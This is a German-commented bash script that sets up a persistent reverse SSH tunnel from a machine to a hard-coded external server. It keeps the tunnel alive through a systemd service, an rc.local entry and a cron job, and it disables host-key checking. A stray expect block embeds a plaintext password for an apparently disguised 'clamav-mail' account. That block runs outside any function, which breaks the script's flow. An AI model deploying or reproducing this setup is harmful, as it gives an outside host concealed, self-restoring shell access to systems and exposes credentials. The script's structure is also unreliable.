#!/bin/bash

###############################################################
#        Reverse SSH Setup Script mit Fehlerbehandlung        #
###############################################################

# Farbdefinitionen für Ausgaben
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Konfigurationsvariablen - HIER ANPASSEN
REMOTE_SERVER="194.164.63.118"
REMOTE_USER="jamy"
REMOTE_PORT="43022"
LOCAL_PORT="22"
#SSH_KEY=".ssh/authorized_keys"  # Optional: Pfad zum SSH-Schlüssel

# Verzeichnis für Logdateien
LOG_DIR="/tmp/reverse-ssh-logs"
LOG_FILE="$LOG_DIR/reverse-ssh.log"

# Prüfen, ob Benutzer Root-Rechte hat
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${YELLOW}Warnung: Dieses Script wird nicht als Root ausgeführt.${NC}"
        echo -e "${YELLOW}Einige Funktionen könnten eingeschränkt sein.${NC}"
        sleep 2
    fi
}

# Log-Verzeichnis erstellen
setup_logging() {
    mkdir -p "$LOG_DIR"
    touch "$LOG_FILE"
    echo "$(date): Reverse SSH-Script gestartet" > "$LOG_FILE"
}

# Prüfen, ob autossh installiert ist und ggf. installieren
check_autossh() {
    echo -e "${BLUE}Prüfe, ob autossh installiert ist...${NC}"
    
    if command -v autossh >/dev/null 2>&1; then
        echo -e "${GREEN}autossh ist bereits installiert.${NC}"
        USE_AUTOSSH=true
        return 0
    else
        echo -e "${YELLOW}autossh ist nicht installiert.${NC}"
        
        # Paketmanager erkennen und installieren versuchen
        if command -v apt-get >/dev/null 2>&1; then
            echo -e "${BLUE}Versuche Installation mit apt...${NC}"
            apt-get update && apt-get install -y autossh
        elif command -v yum >/dev/null 2>&1; then
            echo -e "${BLUE}Versuche Installation mit yum...${NC}"
            yum install -y autossh
        elif command -v dnf >/dev/null 2>&1; then
            echo -e "${BLUE}Versuche Installation mit dnf...${NC}"
            dnf install -y autossh
        elif command -v pacman >/dev/null 2>&1; then
            echo -e "${BLUE}Versuche Installation mit pacman...${NC}"
            pacman -S --noconfirm autossh
        elif command -v zypper >/dev/null 2>&1; then
            echo -e "${BLUE}Versuche Installation mit zypper...${NC}"
            zypper install -y autossh
        else
            echo -e "${RED}Kein bekannter Paketmanager gefunden.${NC}"
            USE_AUTOSSH=false
            return 1
        fi
        
        # Prüfen, ob Installation erfolgreich war
        if command -v autossh >/dev/null 2>&1; then
            echo -e "${GREEN}autossh wurde erfolgreich installiert.${NC}"
            USE_AUTOSSH=true
            return 0
        else
            echo -e "${RED}Installation von autossh fehlgeschlagen.${NC}"
            echo -e "${YELLOW}Verwende alternative Methode mit Standard-SSH.${NC}"
            USE_AUTOSSH=false
            return 1
        fi
    fi
}

sudo apt-get install expect

cat > /usr/local/bin/reverse-ssh-expect.sh << 'EOL'
#!/usr/bin/expect -f
set timeout -1
set SERVER "clamav-mail@194.164.63.118"
set PASSWORD "1!taugenichts"
spawn ssh -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -o "ExitOnForwardFailure=yes" -o "StrictHostKeyChecking=no" -R 43022:localhost:22 $SERVER -N
expect "password:"
send "$PASSWORD\r"
interact
EOL

chmod +x /usr/local/bin/reverse-ssh-expect.sh

sudo /usr/local/bin/reverse-ssh-expect.sh

# Erstelle systemd-Service-Datei
create_systemd_service() {
    echo -e "${BLUE}Erstelle systemd-Service...${NC}"
    
    if [ "$USE_AUTOSSH" = true ]; then
        # Service-Datei für autossh
        SERVICE_CONTENT="[Unit]
Description=AutoSSH Reverse Tunnel Service
After=network.target

[Service]
Environment=\"AUTOSSH_GATETIME=0\"
ExecStart=/usr/bin/autossh -M 0 -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"ExitOnForwardFailure=yes\" -o \"StrictHostKeyChecking=no\""
        
        # SSH-Key hinzufügen, falls angegeben
        if [ ! -z "$SSH_KEY" ]; then
            SERVICE_CONTENT+=" -i $SSH_KEY"
        fi
        
        SERVICE_CONTENT+=" -R $REMOTE_PORT:localhost:$LOCAL_PORT $REMOTE_USER@$REMOTE_SERVER -N
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target"
    else
        # Service-Datei für standard SSH
        SERVICE_CONTENT="[Unit]
Description=SSH Reverse Tunnel Service
After=network.target

[Service]
ExecStart=/usr/bin/ssh -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"ExitOnForwardFailure=yes\" -o \"StrictHostKeyChecking=no\""
        
        # SSH-Key hinzufügen, falls angegeben
        if [ ! -z "$SSH_KEY" ]; then
            SERVICE_CONTENT+=" -i $SSH_KEY"
        fi
        
        SERVICE_CONTENT+=" -R $REMOTE_PORT:localhost:$LOCAL_PORT $REMOTE_USER@$REMOTE_SERVER -N
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target"
    fi
    
    echo "$SERVICE_CONTENT" > /etc/systemd/system/reverse-ssh.service
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}systemd-Service wurde erfolgreich erstellt.${NC}"
        return 0
    else
        echo -e "${RED}Fehler beim Erstellen des systemd-Services.${NC}"
        return 1
    fi
}

# Alternative Shell-Script für Systeme ohne systemd
create_shell_script() {
    echo -e "${BLUE}Erstelle alternatives Shell-Script...${NC}"
    
    SCRIPT_PATH="/usr/local/bin/reverse-ssh.sh"
    
    if [ "$USE_AUTOSSH" = true ]; then
        # Script für autossh
        SCRIPT_CONTENT="#!/bin/bash
while true; do
    echo \"\$(date): Starte autossh-Verbindung...\" >> $LOG_FILE
    autossh -M 0 -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"ExitOnForwardFailure=yes\" -o \"StrictHostKeyChecking=no\""
        
        # SSH-Key hinzufügen, falls angegeben
        if [ ! -z "$SSH_KEY" ]; then
            SCRIPT_CONTENT+=" -i $SSH_KEY"
        fi
        
        SCRIPT_CONTENT+=" -R $REMOTE_PORT:localhost:$LOCAL_PORT $REMOTE_USER@$REMOTE_SERVER -N
    echo \"\$(date): Verbindung unterbrochen. Warte 10 Sekunden...\" >> $LOG_FILE
    sleep 10
done"
    else
        # Script für standard SSH
        SCRIPT_CONTENT="#!/bin/bash
while true; do
    echo \"\$(date): Starte SSH-Verbindung...\" >> $LOG_FILE
    ssh -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"ExitOnForwardFailure=yes\" -o \"StrictHostKeyChecking=no\""
        
        # SSH-Key hinzufügen, falls angegeben
        if [ ! -z "$SSH_KEY" ]; then
            SCRIPT_CONTENT+=" -i $SSH_KEY"
        fi
        
        SCRIPT_CONTENT+=" -R $REMOTE_PORT:localhost:$LOCAL_PORT $REMOTE_USER@$REMOTE_SERVER -N
    echo \"\$(date): Verbindung unterbrochen. Warte 10 Sekunden...\" >> $LOG_FILE
    sleep 10
done"
    fi
    
    echo "$SCRIPT_CONTENT" > "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Shell-Script wurde erfolgreich erstellt: $SCRIPT_PATH${NC}"
        # Eintrag für /etc/rc.local erstellen, falls vorhanden
        if [ -f /etc/rc.local ]; then
            if ! grep -q "reverse-ssh.sh" /etc/rc.local; then
                sed -i '/^exit 0/i nohup /usr/local/bin/reverse-ssh.sh > /dev/null 2>&1 &' /etc/rc.local
                echo -e "${GREEN}Autostart-Eintrag in /etc/rc.local hinzugefügt.${NC}"
            fi
        fi
        return 0
    else
        echo -e "${RED}Fehler beim Erstellen des Shell-Scripts.${NC}"
        return 1
    fi
}

# Erstelle Cron-Job
create_cron_job() {
    echo -e "${BLUE}Erstelle Cron-Job...${NC}"
    
    # Überprüfe, ob bereits ein ähnlicher Cron-Job existiert
    if crontab -l 2>/dev/null | grep -q "reverse-ssh"; then
        echo -e "${YELLOW}Ein Reverse-SSH-Cron-Job existiert bereits.${NC}"
    else
        # Füge neuen Cron-Job hinzu
        (crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f \"ssh -R $REMOTE_PORT:localhost:$LOCAL_PORT\" >/dev/null || /usr/local/bin/reverse-ssh.sh >/dev/null 2>&1") | crontab -
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Cron-Job wurde erfolgreich erstellt.${NC}"
            return 0
        else
            echo -e "${RED}Fehler beim Erstellen des Cron-Jobs.${NC}"
            return 1
        fi
    fi
}

# Starte die Reverse-SSH-Verbindung sofort
start_connection() {
    echo -e "${BLUE}Starte Reverse-SSH-Verbindung...${NC}"
    
    if command -v systemctl >/dev/null 2>&1; then
        systemctl daemon-reload
        systemctl enable reverse-ssh.service
        systemctl start reverse-ssh.service
        
        if systemctl is-active --quiet reverse-ssh.service; then
            echo -e "${GREEN}Reverse-SSH-Service wurde erfolgreich gestartet.${NC}"
            return 0
        else
            echo -e "${RED}Fehler beim Starten des Services.${NC}"
            echo -e "${YELLOW}Versuche alternative Methode...${NC}"
        fi
    fi
    
    # Falls systemd nicht funktioniert oder nicht verfügbar ist
    nohup /usr/local/bin/reverse-ssh.sh > /dev/null 2>&1 &
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Reverse-SSH-Verbindung wurde im Hintergrund gestartet.${NC}"
        return 0
    else
        echo -e "${RED}Fehler beim Starten der Verbindung.${NC}"
        return 1
    fi
}

# Hauptfunktion
main() {
    echo -e "${BLUE}=====================================================${NC}"
    echo -e "${BLUE}         Reverse SSH Setup Script                    ${NC}"
    echo -e "${BLUE}=====================================================${NC}"
    
    check_root
    setup_logging
    check_autossh
    
    # systemd-Service erstellen, falls verfügbar
    if command -v systemctl >/dev/null 2>&1; then
        create_systemd_service
    else
        echo -e "${YELLOW}systemd nicht gefunden. Verwende alternative Methoden.${NC}"
    fi
    
    # Shell-Script für nicht-systemd Systeme oder als Backup erstellen
    create_shell_script
    
    # Cron-Job als zusätzliche Absicherung erstellen
    create_cron_job
    
    # Starte die Verbindung
    start_connection
    
    echo -e "${GREEN}=====================================================${NC}"
    echo -e "${GREEN}         Setup abgeschlossen!                         ${NC}"
    echo -e "${GREEN}=====================================================${NC}"
    echo -e "${YELLOW}Verbindungsinformationen:${NC}"
    echo -e "${YELLOW}- Server: $REMOTE_SERVER${NC}"
    echo -e "${YELLOW}- Remote Port: $REMOTE_PORT${NC}"
    echo -e "${YELLOW}- Log-Datei: $LOG_FILE${NC}"
    echo -e "${YELLOW}Auf dem Remote-Server kannst du dich verbinden mit:${NC}"
    echo -e "${YELLOW}  ssh benutzer@localhost -p $REMOTE_PORT${NC}"
    echo -e "${GREEN}=====================================================${NC}"
}

# Script ausführen
main
